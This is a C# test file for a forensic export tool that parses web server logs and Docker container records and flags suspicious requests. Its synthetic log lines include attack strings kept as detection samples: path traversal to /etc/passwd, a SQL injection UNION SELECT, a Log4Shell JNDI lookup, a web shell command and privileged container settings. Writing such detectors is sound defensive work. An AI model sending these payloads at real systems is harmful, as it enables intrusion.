using System.IO.Compression;
using System.Text;
using System.Text.Json;
using ArtefactForge.Core.Linux;

namespace ArtefactForge.Tests;

/// <summary>
/// Written against synthetic logs and a hand-built Docker tree: no real web server or Docker host
/// was available when these modules were written. Formats follow the Apache, nginx and Docker
/// defaults; treat both modules as unverified against live evidence until one has been run.
/// </summary>
public class WebLogExportTests
{
    private const string Combined =
        "198.51.100.7 - admin [11/Oct/2023:14:33:01 +0100] \"GET /cgi-bin/../../etc/passwd HTTP/1.1\" 404 196 \"-\" \"curl/7.81.0\"";

    [Fact]
    public void Combined_format_is_parsed_and_converted_to_utc()
    {
        var row = WebLogExport.ParseAccess(Combined, "apache", "access.log", 2)!;
        Assert.Equal("2023-10-11 13:33:01", row[0]);
        Assert.Equal("198.51.100.7", row[4]);
        Assert.Equal("admin", row[5]);
        Assert.Equal("GET", row[6]);
        Assert.Equal("/cgi-bin/../../etc/passwd", row[7]);
        Assert.Equal("404", row[9]);
        Assert.Equal("curl/7.81.0", row[12]);
        Assert.Equal("PathTraversal;SensitiveFile", row[13]);
    }

    [Fact]
    public void Vhost_prefix_and_ipv6_client_are_told_apart()
    {
        var vhost = WebLogExport.ParseAccess(
            "www.example.test:443 192.0.2.50 - - [11/Oct/2023:15:00:00 -0500] \"GET / HTTP/1.1\" 200 42 \"-\" \"a\"", "apache", "f", 1)!;
        Assert.Equal("www.example.test:443", vhost[3]);
        Assert.Equal("2023-10-11 20:00:00", vhost[0]);

        var v6 = WebLogExport.ParseAccess(
            "2001:db8::1 - - [11/Oct/2023:15:00:00 +0000] \"GET / HTTP/1.1\" 200 42", "nginx", "f", 1)!;
        Assert.Equal("", v6[3]);
        Assert.Equal("2001:db8::1", v6[4]);
    }

    [Fact]
    public void Custom_format_is_not_half_parsed()
    {
        Assert.Null(WebLogExport.ParseAccess("1697031172 192.0.2.1 GET /x 200", "apache", "f", 1));
    }

    [Theory]
    [InlineData("/search?q=1%27%20UNION%20SELECT%20pw%20FROM%20users", "", "SqlInjection")]
    [InlineData("/%2e%2e%2f%2e%2e%2fetc%2fpasswd", "", "PathTraversal;SensitiveFile")]
    [InlineData("/x", "${jndi:ldap://203.0.113.5/a}", "")]
    [InlineData("/${jndi:ldap://203.0.113.5/a}", "", "Log4Shell")]
    [InlineData("/uploads/shell.php?cmd=id", "", "WebShell")]
    [InlineData("/index.html", "sqlmap/1.7", "ScannerAgent")]
    [InlineData("/index.html;jsessionid=ABC", "Mozilla/5.0", "")]
    public void Flags_name_the_reason(string url, string agent, string expected) =>
        Assert.Equal(expected, WebLogExport.Flags(url, agent));

    [Fact]
    public void Error_logs_from_both_servers_and_continuation_lines()
    {
        var apache = WebLogExport.ParseError(
            "[Wed Oct 11 14:32:52.123456 2023] [core:error] [pid 1234:tid 5] [client 198.51.100.7:51234] AH00126: bad", "apache", "f", 1);
        Assert.Equal(new[] { "2023-10-11 14:32:52.123456", "apache", "error", "core", "1234", "198.51.100.7:51234", "AH00126: bad", "f", "1" }, apache);

        var nginx = WebLogExport.ParseError(
            "2023/10/11 14:32:52 [error] 1234#1234: *5 open() \"/x\" failed (2: No such file), client: 198.51.100.7, server: _", "nginx", "f", 1);
        Assert.Equal("open() \"/x\" failed (2: No such file)", nginx[6]);
        Assert.Equal("198.51.100.7", nginx[5]);

        var continuation = WebLogExport.ParseError("PHP Stack trace:", "apache", "f", 3);
        Assert.Equal("", continuation[0]);
        Assert.Equal("PHP Stack trace:", continuation[6]);
    }

    [Fact]
    public void Rotated_history_is_read_oldest_first_including_gzip()
    {
        using var dir = new TempDirectory();
        var logs = dir.Dir(Path.Combine("root", "var", "log", "apache2"));
        string Line(string path) => $"192.0.2.1 - - [11/Oct/2023:10:00:00 +0000] \"GET {path} HTTP/1.1\" 200 1";
        File.WriteAllText(Path.Combine(logs, "access.log"), Line("/live") + "\n");
        File.WriteAllText(Path.Combine(logs, "access.log.1"), Line("/one") + "\n");
        using (var gz = new GZipStream(File.Create(Path.Combine(logs, "access.log.10.gz")), CompressionLevel.Fastest))
            gz.Write(Encoding.UTF8.GetBytes(Line("/ten") + "\n"));
        using (var gz = new GZipStream(File.Create(Path.Combine(logs, "access.log.2.gz")), CompressionLevel.Fastest))
            gz.Write(Encoding.UTF8.GetBytes(Line("/two") + "\n"));

        var errors = new StringWriter();
        WebLogExport.Run(Path.Combine(dir.Path, "root"), Path.Combine(dir.Path, "out"), new StringWriter(), errors, CancellationToken.None);

        var urls = File.ReadAllLines(Path.Combine(dir.Path, "out", "LinuxWebLogs_Access.csv")).Skip(1)
            .Select(l => l.Split("\",\"")[7]).ToArray();
        Assert.Equal(new[] { "/ten", "/two", "/one", "/live" }, urls);
        Assert.Equal("", errors.ToString());
        Assert.False(File.Exists(Path.Combine(dir.Path, "out", "LinuxWebLogs_Flagged.csv")));
    }

    [Fact]
    public void Unparsed_lines_are_counted_in_the_error_log()
    {
        using var dir = new TempDirectory();
        var logs = dir.Dir(Path.Combine("root", "var", "log", "nginx"));
        File.WriteAllText(Path.Combine(logs, "access.log"), Combined + "\nnot a log line\n");

        var errors = new StringWriter();
        WebLogExport.Run(Path.Combine(dir.Path, "root"), Path.Combine(dir.Path, "out"), new StringWriter(), errors, CancellationToken.None);
        Assert.Contains("1 of 2 line(s)", errors.ToString());
    }
}

public class ContainerExportTests
{
    private const string Id = "a1b2c3d4e5f60000000000000000000000000000000000000000000000000000";

    private static string Docker(TempDirectory dir) => dir.Dir(Path.Combine("root", "var", "lib", "docker"));

    private static void Container(string docker, object config, object? host = null, params string[] logLines)
    {
        var d = Directory.CreateDirectory(Path.Combine(docker, "containers", Id)).FullName;
        File.WriteAllText(Path.Combine(d, "config.v2.json"), JsonSerializer.Serialize(config));
        if (host is not null) File.WriteAllText(Path.Combine(d, "hostconfig.json"), JsonSerializer.Serialize(host));
        if (logLines.Length > 0) File.WriteAllLines(Path.Combine(d, Id + "-json.log"), logLines);
    }

    private static (List<Dictionary<string, string>> Rows, string Errors) Run(TempDirectory dir, string file)
    {
        var errors = new StringWriter();
        ContainerExport.Run(Path.Combine(dir.Path, "root"), Path.Combine(dir.Path, "out"), new StringWriter(), errors, CancellationToken.None);
        var path = Path.Combine(dir.Path, "out", file);
        if (!File.Exists(path)) return ([], errors.ToString());

        var lines = File.ReadAllLines(path);
        var header = lines[0].Trim('"').Split("\",\"");
        var rows = lines.Skip(1).Select(l => header.Zip(l.Trim('"').Split("\",\"")).ToDictionary(p => p.First, p => p.Second)).ToList();
        return (rows, errors.ToString());
    }

    [Fact]
    public void Escape_relevant_settings_are_reported_and_env_values_are_not()
    {
        using var dir = new TempDirectory();
        Container(Docker(dir),
            new
            {
                ID = Id, Name = "/web", Created = "2024-01-02T03:04:00.987654321Z", Image = "sha256:" + new string('f', 64),
                State = new { Running = true, Pid = 42, ExitCode = 0, StartedAt = "2024-01-02T03:04:05.123456789Z", FinishedAt = "0001-01-01T00:00:00Z" },
                Config = new { Image = "nginx:latest", User = "", Env = new[] { "PATH=/usr/bin", "DB_PASSWORD=hunter2" }, Entrypoint = new[] { "/entry.sh" }, Cmd = new[] { "nginx" } },
                MountPoints = new Dictionary<string, object> { ["/host"] = new { Source = "/", RW = false } }
            },
            new { Privileged = true, NetworkMode = "host", PidMode = "host", CapAdd = new[] { "SYS_ADMIN" },
                  PortBindings = new Dictionary<string, object[]> { ["80/tcp"] = [new { HostIp = "", HostPort = "8080" }] },
                  RestartPolicy = new { Name = "always" } });

        var (rows, errors) = Run(dir, "LinuxContainers_Containers.csv");
        var c = Assert.Single(rows);

        Assert.Equal("a1b2c3d4e5f6", c["ContainerId"]);
        Assert.Equal("web", c["Name"]);
        Assert.Equal("2024-01-02 03:04:05.123456", c["StartedUtc"]);
        Assert.Equal("", c["FinishedUtc"]);
        Assert.Equal("/entry.sh nginx", c["Command"]);
        Assert.Equal("true", c["Privileged"]);
        Assert.Equal("host", c["PidMode"]);
        Assert.Equal("/:/host:ro", c["Mounts"]);
        Assert.Equal("8080->80/tcp", c["Ports"]);
        Assert.Equal("PATH;DB_PASSWORD", c["EnvNames"]);
        Assert.DoesNotContain("hunter2", File.ReadAllText(Path.Combine(dir.Path, "out", "LinuxContainers_Containers.csv")));
        Assert.Equal("", errors);
    }

    [Fact]
    public void Logs_are_read_and_a_bad_line_is_counted_not_fatal()
    {
        using var dir = new TempDirectory();
        Container(Docker(dir), new { ID = Id, Name = "/web", Config = new { } }, null,
            "{\"log\":\"hello\\n\",\"stream\":\"stdout\",\"time\":\"2024-01-02T03:05:00.000000001Z\"}",
            "{broken",
            "{\"log\":\"boom\\n\",\"stream\":\"stderr\",\"time\":\"2024-01-02T03:06:00.5Z\"}");

        var (rows, errors) = Run(dir, "LinuxContainers_Logs.csv");
        Assert.Equal(2, rows.Count);
        Assert.Equal("hello", rows[0]["Message"]);
        Assert.Equal("web", rows[0]["ContainerName"]);
        Assert.Equal("2024-01-02 03:06:00.500000", rows[1]["TimestampUtc"]);
        Assert.Contains("1 line(s) were not valid JSON", errors);
    }

    [Fact]
    public void A_damaged_config_is_reported_and_its_logs_still_read()
    {
        using var dir = new TempDirectory();
        var d = Directory.CreateDirectory(Path.Combine(Docker(dir), "containers", Id)).FullName;
        File.WriteAllText(Path.Combine(d, "config.v2.json"), "{\"ID\": \"trunc");
        File.WriteAllText(Path.Combine(d, Id + "-json.log"), "{\"log\":\"x\",\"stream\":\"stdout\",\"time\":\"2024-01-01T00:00:00Z\"}\n");

        var (rows, errors) = Run(dir, "LinuxContainers_Logs.csv");
        Assert.Single(rows);
        Assert.Contains("not valid JSON", errors);
    }

    [Fact]
    public void Images_are_listed_with_their_creation_time()
    {
        using var dir = new TempDirectory();
        var image = Directory.CreateDirectory(Path.Combine(Docker(dir), "image", "overlay2", "imagedb", "content", "sha256")).FullName;
        var id = new string('f', 64);
        File.WriteAllText(Path.Combine(image, id), "{\"created\":\"2023-12-01T10:00:00Z\"}");
        File.WriteAllText(Path.Combine(Docker(dir), "image", "overlay2", "repositories.json"),
            "{\"Repositories\":{\"nginx\":{\"nginx:latest\":\"sha256:" + id + "\"}}}");

        var (rows, _) = Run(dir, "LinuxContainers_Images.csv");
        var row = Assert.Single(rows);
        Assert.Equal("latest", row["Tag"]);
        Assert.Equal("2023-12-01 10:00:00.000000", row["CreatedUtc"]);
    }

    [Fact]
    public void No_docker_folders_is_not_an_error()
    {
        using var dir = new TempDirectory();
        Docker(dir);
        var (rows, errors) = Run(dir, "LinuxContainers_Containers.csv");
        Assert.Empty(rows);
        Assert.Equal("", errors);
    }
}

public class RotatedLogTests
{
    [Fact]
    public void A_truncated_gzip_is_reported_not_read_as_a_short_log()
    {
        using var dir = new TempDirectory();
        var logs = dir.Dir(Path.Combine("root", "var", "log", "nginx"));
        var full = new MemoryStream();
        using (var gz = new GZipStream(full, CompressionLevel.Optimal, leaveOpen: true))
            for (var i = 0; i < 2000; i++)
                gz.Write(Encoding.UTF8.GetBytes($"192.0.2.1 - - [11/Oct/2023:10:00:00 +0000] \"GET /{i} HTTP/1.1\" 200 1\n"));
        File.WriteAllBytes(Path.Combine(logs, "access.log.2.gz"), full.ToArray()[..(int)(full.Length / 2)]);

        var errors = new StringWriter();
        WebLogExport.Run(Path.Combine(dir.Path, "root"), Path.Combine(dir.Path, "out"), new StringWriter(), errors, CancellationToken.None);

        Assert.Contains("access.log.2.gz: incomplete", errors.ToString());
    }
}
